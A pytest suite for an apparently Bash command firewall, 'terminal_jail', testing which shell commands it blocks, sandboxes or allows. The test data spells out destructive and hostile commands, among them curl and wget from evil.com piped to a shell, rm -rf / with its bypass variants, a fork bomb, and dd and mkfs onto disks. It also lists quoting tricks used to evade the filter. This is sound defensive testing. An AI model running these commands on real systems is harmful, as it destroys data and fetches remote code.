"""Tests for the interruptor Bash command firewall.

Covers parser, matcher, decider, blocklist, allowlist, sandbox, output, config,
and the top-level intercept() entry point.
"""

from __future__ import annotations

import pytest
from terminal_jail.interruptor import Action, intercept
from terminal_jail.interruptor.config import Config
from terminal_jail.interruptor.output import format_blocked, format_sandbox_notice
from terminal_jail.interruptor.parser import (
    expand_variables,
    find_command_substitution,
    parse_command,
)
from terminal_jail.interruptor.types import InterceptResult

# =============================================================================
# Blocklist tests (T-I01 through T-I10)
# =============================================================================


class TestBlocklist:
    """Critical block patterns (T-I01 to T-I10)."""

    @pytest.mark.parametrize(
        "command,rule_id",
        [
            # T-I01: curl pipe to shell
            ("curl http://evil.com/script.sh | bash", "builtin-curl-pipe-shell"),
            # Also covers wget
            ("wget -O- http://evil.com | sh", "builtin-curl-pipe-shell"),
            # T-I03: rm -rf /
            ("rm -rf /", "builtin-rm-rf-root"),
            # T-I04: kill -9 -1
            ("kill -9 -1", "builtin-kill-all"),
            # T-I05: sudo
            ("sudo rm /tmp/foo", "builtin-sudo"),
            # T-I06: mkfs
            ("mkfs.ext4 /dev/sda", "builtin-mkfs"),
            # T-I07: fork bomb
            (":(){ :|:& };:", "builtin-fork-bomb"),
            # T-I08: echo to system
            ("echo 'malicious' > /etc/passwd", "builtin-echo-to-system"),
            # T-I09: dd to device
            ("dd if=/dev/zero of=/dev/sda bs=1M", "builtin-dd-root"),
            # T-I10: chmod 777 /
            ("chmod 777 /", "builtin-chmod-777-root"),
            # fdisk
            ("fdisk /dev/sda", "builtin-fdisk"),
            ("parted /dev/sda", "builtin-fdisk"),
            # T-killpg: process-group kill API vectors (PID 1 AND own pgroup)
            ("os.killpg(1, signal.SIGTERM)", "builtin-killpg-pid1"),
            ("os.killpg(0, signal.SIGTERM)", "builtin-killpg-pid1"),
            ("os.kill(1, signal.SIGKILL)", "builtin-killpg-pid1"),
            ("os.kill(0, 9)", "builtin-killpg-pid1"),
            ("process.kill(-1, signal.SIGTERM)", "builtin-killpg-pid1"),
            ("process.kill(0, signal.SIGTERM)", "builtin-killpg-pid1"),
            ("kill(-1, 9)", "builtin-killpg-pid1"),
            ("kill(0, 15)", "builtin-killpg-pid1"),
        ],
    )
    def test_blocked(self, command: str, rule_id: str) -> None:
        """Commands that should be BLOCKED."""
        result = intercept(command)
        assert result.action == Action.BLOCK, (
            f"Expected BLOCK for {command!r}, got {result.action}"
        )
        assert result.rule_id == rule_id, (
            f"Expected rule {rule_id!r} for {command!r}, got {result.rule_id!r}"
        )

    @pytest.mark.parametrize(
        "command",
        [
            # T-I17 through T-I26: safe commands that should NOT be blocked
            "echo hello",
            "ls -la",
            "pwd",
            "grep foo *.py",
            "git status",
            "which python3",
            "python3 --version",
            # T-killpg benign: high-pid pgroup kills must stay allowed
            "os.killpg(12345, signal.SIGTERM)",
            "os.kill(456, signal.SIGTERM)",
            # T-I03 scope correction (TJ-DF-001): the rm -rf rule is
            # ROOT-scoped per its id/name/message — /var is not root, so
            # `rm -rf /var` is allowed (the old pattern's /var match was an
            # over-match artifact of the buggy `-?rf\s+/` regex).
            "rm -rf /var",
        ],
    )
    def test_safe_commands(self, command: str) -> None:
        """Commands that should be ALLOWED."""
        result = intercept(command)
        assert result.action in (Action.ALLOW, Action.MODIFY), (
            f"Expected ALLOW/MODIFY for {command!r}, got {result.action}"
        )


# =============================================================================
# Auto-sandbox tests (T-I11 through T-I16)
# =============================================================================


class TestSandbox:
    """Auto-sandbox patterns (T-I11 to T-I16)."""

    @pytest.mark.parametrize(
        "command,rule_id",
        [
            # T-I11: pytest
            ("pytest", "auto-pytest"),
            ("tox", "auto-pytest"),
            # T-I12: npm test
            ("npm test", "auto-npm-test"),
            ("npx vitest", "auto-npm-test"),
            # T-I13: go test
            ("go test ./...", "auto-go-test"),
            # T-I14: make
            ("make build", "auto-make"),
            ("make", "auto-make"),
            # T-I15: pip install
            ("pip install foo", "auto-pip"),
            # T-I16: script execution
            # Note: auto-script pattern requires .sh/.py/.rb extension
            ("./script.sh", "auto-script"),
            ("./deploy.py", "auto-script"),
            # Explicit interpreter invocation of a script file must ALSO be
            # sandboxed — `bash evil.sh` bypassed the ./ pattern (tick #72,
            # prior interactive session finding: only ./ matched).
            ("bash evil_script.sh", "auto-script"),
            ("sh evil_script.sh", "auto-script"),
            ("dash script.sh", "auto-script"),
            ("zsh custom.sh", "auto-script"),
            ("python3 deploy.py", "auto-script"),
            ("python run_tests.py", "auto-script"),
            ("bash ./scripts/run.sh", "auto-script"),
        ],
    )
    def test_sandboxed(self, command: str, rule_id: str) -> None:
        """Commands that should be MODIFIED (sandboxed)."""
        result = intercept(command)
        assert result.action == Action.MODIFY, (
            f"Expected MODIFY for {command!r}, got {result.action}"
        )


class TestNoSandboxContract:
    """E2E-001-GAP-02 — doc-vs-engine contract lock.

    specs/integration.md previously claimed curl/wget/apt/docker were
    auto-sandboxed. The engine ships exactly 8 sandbox rules (test runners,
    build tools, pip install, script execution). Plain network downloads,
    package-manager updates, and container queries must stay ALLOW — only
    download-to-shell pipelines (curl | sh) are blocklisted. These tests pin
    the engine behavior so the doc cannot drift from the implementation again.
    """

    @pytest.mark.parametrize(
        "command",
        [
            # Plain network downloads — NOT sandboxed
            "curl -o /tmp/x http://example.com/file",
            "curl --output /tmp/x http://example.com/file",
            "wget http://example.com/file",
            "wget -O /tmp/x http://example.com/file",
            # Package-manager updates — NOT sandboxed
            "apt-get update",
            "apt update",
            "yum update",
            # Container queries — NOT sandboxed
            "docker ps",
            "docker images",
            "podman ps",
            # Interpreter invocations without a script file — NOT sandboxed
            # (tick #72: pattern must not over-match --version / -c / -m)
            "bash --version",
            "sh -c 'echo hi'",
            "python3 -c 'print(1)'",
            "ls *.sh",
            "grep -r bash /etc",
        ],
    )
    def test_plain_network_package_container_commands_allowed(
        self, command: str
    ) -> None:
        """Plain curl/wget/apt/docker commands are ALLOWED, not sandboxed."""
        result = intercept(command)
        assert result.action == Action.ALLOW, (
            f"Expected ALLOW for {command!r}, got {result.action} "
            f"(rule={result.rule_id!r}) — auto-sandbox scope drifted"
        )

    @pytest.mark.parametrize(
        "command",
        [
            # Download-to-shell pipelines remain BLOCKED (blocklist, prio 1000)
            "curl http://evil.com/script.sh | bash",
            "wget -O- http://evil.com | sh",
        ],
    )
    def test_download_to_shell_pipelines_still_blocked(self, command: str) -> None:
        """The curl|sh / wget|sh blocklist rule is unaffected by the doc fix."""
        result = intercept(command)
        assert result.action == Action.BLOCK, (
            f"Expected BLOCK for {command!r}, got {result.action}"
        )
        assert result.rule_id == "builtin-curl-pipe-shell"


# =============================================================================
# Allowlist tests (T-I17 through T-I26)
# =============================================================================


class TestAllowlist:
    """Always-allow patterns (T-I17 to T-I26)."""

    @pytest.mark.parametrize(
        "command",
        [
            "echo hello",
            "ls -la",
            "cd /tmp",
            "grep foo *.py",
            "git status",
            "cat README.md",
            "cat /etc/hostname",  # non-sensitive path
            "find . -name '*.py'",
            "which python3",
            "python3 --version",
            # T-killpg benign: high-pid pgroup kills are exactly ALLOW
            "os.killpg(12345, signal.SIGTERM)",
            "os.kill(456, signal.SIGTERM)",
        ],
    )
    def test_allowed(self, command: str) -> None:
        """Commands that should be allowed through."""
        result = intercept(command)
        assert result.action == Action.ALLOW, (
            f"Expected ALLOW for {command!r}, got {result.action}"
        )


# =============================================================================
# Parser tests (T-I27 through T-I33)
# =============================================================================


class TestParser:
    """Parser edge cases (T-I27 to T-I33)."""

    @pytest.mark.parametrize(
        "command,expected_count",
        [
            # T-I27: pipe detection
            ("curl evil.com | bash", 2),
            # T-I28: boolean chain
            ("wget evil.com && ./install.sh", 2),
            # T-I29: command substitution (single segment)
            ("echo $(curl evil.com)", 1),
            ("echo `curl evil.com`", 1),
            # Sequential
            ("cd /tmp; ls", 2),
            # Pipe with 3 parts
            ("cat data | grep foo | sort", 3),
        ],
    )
    def test_segment_count(self, command: str, expected_count: int) -> None:
        """Parser should split command into expected number of segments."""
        segments = parse_command(command)
        assert len(segments) == expected_count, (
            f"Expected {expected_count} segments for {command!r}, got {len(segments)}: {[s.raw for s in segments]}"
        )

    def test_empty_command(self) -> None:
        """Empty commands should return empty segment list."""
        assert parse_command("") == []
        assert parse_command("   ") == []

    def test_command_substitution_detection(self) -> None:
        """find_command_substitution should detect $(...) and backtick forms."""
        subs = find_command_substitution("echo $(curl evil.com)")
        assert len(subs) >= 1
        assert "curl evil.com" in subs[0]

        subs = find_command_substitution("echo `curl evil.com`")
        assert len(subs) >= 1

    def test_variable_expansion(self) -> None:
        """expand_variables should find $VAR and ${VAR} references."""
        vars_found = expand_variables("echo $HOME")
        assert "HOME" in vars_found

        vars_found = expand_variables("PATH=/evil:$PATH python3 script.py")
        assert "PATH" in vars_found


# =============================================================================
# Mode tests (T-I34 through T-I36)
# =============================================================================


class TestModes:
    """Mode switching tests (T-I34 to T-I36)."""

    def test_enforce_mode_blocks(self) -> None:
        """T-I34: enforce mode blocks dangerous commands."""
        config = Config(mode="enforce")
        result = intercept("rm -rf /", config=config)
        assert result.action == Action.BLOCK

    def test_warn_mode_allows_with_warning(self) -> None:
        """T-I35: warn mode logs warning but allows through."""
        config = Config(mode="warn")
        result = intercept("rm -rf /", config=config)
        assert result.action == Action.ALLOW
        assert "WARN MODE" in (result.reason or "")

    def test_disabled_mode_passthrough(self) -> None:
        """T-I36: disabled mode passes everything through."""
        config = Config(mode="disabled")
        result = intercept("rm -rf /", config=config)
        assert result.action == Action.ALLOW


# =============================================================================
# Config tests
# =============================================================================


class TestConfig:
    """Environment-based configuration."""

    def test_default_mode(self) -> None:
        """Default config should be enforce mode."""
        config = Config()
        assert config.mode == "enforce"

    def test_invalid_mode_fallback(self) -> None:
        """Invalid mode should fall back to enforce."""
        config = Config(mode="invalid_mode")
        assert config.mode == "enforce"

    def test_from_environ(self, monkeypatch: pytest.MonkeyPatch) -> None:
        """from_environ should read from environment."""
        monkeypatch.setenv("TERMINAL_JAIL_INTERRUPTOR_MODE", "warn")
        monkeypatch.setenv("TERMINAL_JAIL_INTERRUPTOR_LOG_LEVEL", "DEBUG")
        config = Config.from_environ()
        assert config.mode == "warn"
        assert config.log_level == "DEBUG"


# =============================================================================
# Output tests
# =============================================================================


class TestOutput:
    """Output formatting."""

    def test_format_blocked(self) -> None:
        """format_blocked should produce box-drawing output."""
        result = InterceptResult(
            action="block",
            command="rm -rf /",
            rule_id="builtin-rm-rf-root",
            reason="Blocked for testing",
        )
        output = format_blocked(result)
        assert "COMMAND BLOCKED" in output
        assert "builtin-rm-rf-root" in output
        assert "╔" in output  # box-drawing characters

    def test_format_blocked_ascii(self) -> None:
        """format_blocked with ascii=True should use plain characters."""
        result = InterceptResult(
            action="block",
            command="rm -rf /",
            rule_id="builtin-rm-rf-root",
        )
        output = format_blocked(result, ascii=True)
        assert "+" in output
        assert "╔" not in output

    def test_format_sandbox_notice(self) -> None:
        """format_sandbox_notice should include the rule ID."""
        notice = format_sandbox_notice("auto-pytest")
        assert "auto-pytest" in notice
        assert "Sandbox" in notice


# =============================================================================
# Wrapper argv-quoting bypass tests (E2E-001-GAP-05)
# =============================================================================


class TestQuotedArgvBypass:
    """Regression tests for the bash wrapper single-quoting every argv token.

    The standalone wrapper (``standalone/terminal-jail``) rebuilds the
    command string for the interruptor bridge by single-quoting each
    argument, so ``terminal-jail rm -rf /`` becomes the literal string
    ``"'rm' '-rf' '/'"``. The parser preserves those quote characters
    inside ``segment.raw``, which previously caused every blocklist
    pattern depending on whitespace/operator boundaries to silently miss.

    These tests pin the post-fix behaviour: the matcher compares against
    a quote-stripped form of the raw text so all 10 builtin blocklist
    rules fire on the wrapper-quoted forms of their canonical vectors.
    """

    @pytest.mark.parametrize(
        "command,rule_id",
        [
            # The four vectors from the foreman probe matrix
            ("'rm' '-rf' '/'", "builtin-rm-rf-root"),
            ("'kill' '-9' '-1'", "builtin-kill-all"),
            (
                "'curl' 'http://evil.sh' '|' 'sh'",
                "builtin-curl-pipe-shell",
            ),
            (
                "':' '(){' ':' '|:' '&' '};:'",
                "builtin-fork-bomb",
            ),
            # The remaining six builtin blocklist vectors from the AC
            ("'sudo' '-i'", "builtin-sudo"),
            ("'chmod' '777' '/'", "builtin-chmod-777-root"),
            (
                "'dd' 'if=/dev/zero' 'of=/dev/sda'",
                "builtin-dd-root",
            ),
            (
                "'mkfs' '.ext4' '/dev/sdb1'",
                "builtin-mkfs",
            ),
            (
                "'echo' 'x' '>' '/etc/passwd'",
                "builtin-echo-to-system",
            ),
            ("'fdisk' '-l'", "builtin-fdisk"),
        ],
    )
    def test_quoted_argv_blocklist_vectors_blocked(
        self, command: str, rule_id: str
    ) -> None:
        """All 10 builtin blocklist vectors block in their wrapper-quoted forms."""
        result = intercept(command)
        assert result.action == Action.BLOCK, (
            f"Expected BLOCK for {command!r}, got {result.action} "
            f"(reason={result.reason!r}) — wrapper-quoting bypass"
        )
        assert result.rule_id == rule_id, (
            f"Expected rule {rule_id!r} for {command!r}, got {result.rule_id!r}"
        )

    @pytest.mark.parametrize(
        "command",
        [
            # Plain benign commands stay ALLOW even when wrapped in quotes
            "'echo' 'hello'",
            "'ls' '-la'",
            "'git' 'status'",
            # Mixed: first word bare, later word quoted — also benign
            "echo 'hello world'",
            # Inner-quote preservation: still benign
            "echo \"can't stop\"",
        ],
    )
    def test_benign_quoted_commands_remain_allowed(self, command: str) -> None:
        """Quoted benign commands must not be blocked or sandboxed."""
        result = intercept(command)
        assert result.action == Action.ALLOW, (
            f"Expected ALLOW for {command!r}, got {result.action} "
            f"(rule={result.rule_id!r}) — quote-stripping introduced a "
            f"false positive"
        )

    def test_quoted_pytest_still_sandboxed(self) -> None:
        """Sandbox modify path is unaffected: quoted pytest still gets MODIFY.

        The auto-pytest pattern ``pytest|tox|nose`` matches the
        quote-stripped form ``pytest --version`` as a substring of
        ``pytest``, so the modify path continues to wrap the command in
        an unshare namespace. The matcher's normalise-and-search keeps
        the modify contract intact.

        Note: the decider's top-level ``evaluate()`` aggregates per-
        segment MODIFY results into a single InterceptResult without
        preserving the per-segment ``rule_id`` (a pre-existing
        behaviour, not introduced by this fix), so we assert on
        ``action`` and the ``modified`` payload instead.
        """
        result = intercept("'pytest' '--version'")
        assert result.action == Action.MODIFY, (
            f"Expected MODIFY for 'pytest --version' (quoted), got "
            f"{result.action} (rule={result.rule_id!r}) — modify path "
            f"broken by quote-stripping"
        )
        assert result.modified is not None, (
            "MODIFY result must include a non-null `modified` payload"
        )
        assert "pytest" in result.modified
        assert "--version" in result.modified
        assert "unshare" in result.modified, (
            "modified payload should wrap the command in unshare"
        )


class TestRmRfRootBypassRegression:
    """TJ-DF-001 (P0) — order-independent flag set + root-scoped target.

    The old pattern ``rm\\s+(-{1,2})?\\s*-?rf\\s+/`` could not cross a flag
    token, so every canonical GNU root-delete form evaluated to allow:
    ``rm -rf --no-preserve-root /`` (the ONLY form GNU rm honors for /),
    ``rm -r -f /``, ``rm --recursive --force /``, and ``rm -rf/``.

    The replacement matches the recursive+force flag set order-independently
    (two lookaheads: any of -r/-R/--recursive, possibly combined like -rf/-fr,
    plus any of -f/--force) and requires the target to be exactly ``/`` or
    ``/*`` — non-root paths (e.g. /var) are NOT blocked (scope correction:
    the old /var block was an over-match artifact of the buggy regex).
    """

    @pytest.mark.parametrize(
        "command",
        [
            # Canonical form
            "rm -rf /",
            # The P0 bypass: --no-preserve-root is the only form GNU rm
            # honors for /, so this is exactly the attack the old pattern
            # let through.
            "rm -rf --no-preserve-root /",
            # Flag set split across tokens (order-independent)
            "rm -r -f /",
            # Long-form flags
            "rm --recursive --force /",
            # No space before the path (old pattern required whitespace)
            "rm -rf/",
            # Root glob — same catastrophic class
            "rm -rf /*",
            # Wrapper-quoted argv form (via _normalize_quoted)
            "'rm' '-rf' '/'",
        ],
    )
    def test_root_delete_variants_blocked(self, command: str) -> None:
        """Every recursive+force root-delete variant must BLOCK."""
        result = intercept(command)
        assert result.action == Action.BLOCK, (
            f"Expected BLOCK for {command!r}, got {result.action} "
            f"(rule={result.rule_id!r}) — rm -rf root bypass (TJ-DF-001)"
        )
        assert result.rule_id == "builtin-rm-rf-root", (
            f"Expected builtin-rm-rf-root for {command!r}, got {result.rule_id!r}"
        )

    @pytest.mark.parametrize(
        "command",
        [
            # Non-root targets must stay allowed
            "rm -rf /tmp/foo",
            "rm -rf ./build",
            # Incomplete flag sets
            "rm -r /var",  # recursive but no force
            "rm -f /var",  # force but not recursive
            # Scope correction (TJ-DF-001): root-scoped rule, /var is not root
            "rm -rf /var",
            # Not even an rm invocation with flags
            "rm file",
        ],
    )
    def test_non_root_rm_allowed(self, command: str) -> None:
        """Non-root or incomplete-flag rm commands must stay ALLOW."""
        result = intercept(command)
        assert result.action == Action.ALLOW, (
            f"Expected ALLOW for {command!r}, got {result.action} "
            f"(rule={result.rule_id!r}) — false positive (TJ-DF-001)"
        )


class TestNormalizeQuotedHelper:
    """Unit tests for the matcher's internal quote-stripping helper."""

    def test_strips_single_quoted_tokens(self) -> None:
        from terminal_jail.interruptor.matcher import _normalize_quoted

        assert _normalize_quoted("'rm' '-rf' '/'") == "rm -rf /"

    def test_strips_double_quoted_tokens(self) -> None:
        from terminal_jail.interruptor.matcher import _normalize_quoted

        assert _normalize_quoted('"rm" "-rf" "/"') == "rm -rf /"

    def test_mixed_quote_styles(self) -> None:
        from terminal_jail.interruptor.matcher import _normalize_quoted

        # The wrapper uses single quotes; if a token happens to be
        # wrapped in double quotes the helper still strips the pair.
        assert _normalize_quoted("'rm' \"-rf\" '/'") == "rm -rf /"

    def test_preserves_inner_quotes(self) -> None:
        from terminal_jail.interruptor.matcher import _normalize_quoted

        # An outer-double-quoted token containing a single quote should
        # not have its inner single quote touched.
        assert (
            _normalize_quoted("echo \"can't stop\"") == "echo \"can't stop\""
        )

    def test_unbalanced_quote_left_alone(self) -> None:
        from terminal_jail.interruptor.matcher import _normalize_quoted

        # Single quote with no matching close — the helper leaves the
        # token untouched rather than risk a wrong strip.
        assert _normalize_quoted("echo 'unterminated") == "echo 'unterminated"

    def test_empty_input(self) -> None:
        from terminal_jail.interruptor.matcher import _normalize_quoted

        assert _normalize_quoted("") == ""

    def test_bare_text_noop(self) -> None:
        from terminal_jail.interruptor.matcher import _normalize_quoted

        assert _normalize_quoted("rm -rf /") == "rm -rf /"

    def test_single_quoted_token_no_whitespace(self) -> None:
        from terminal_jail.interruptor.matcher import _normalize_quoted

        assert _normalize_quoted("'only'") == "only"
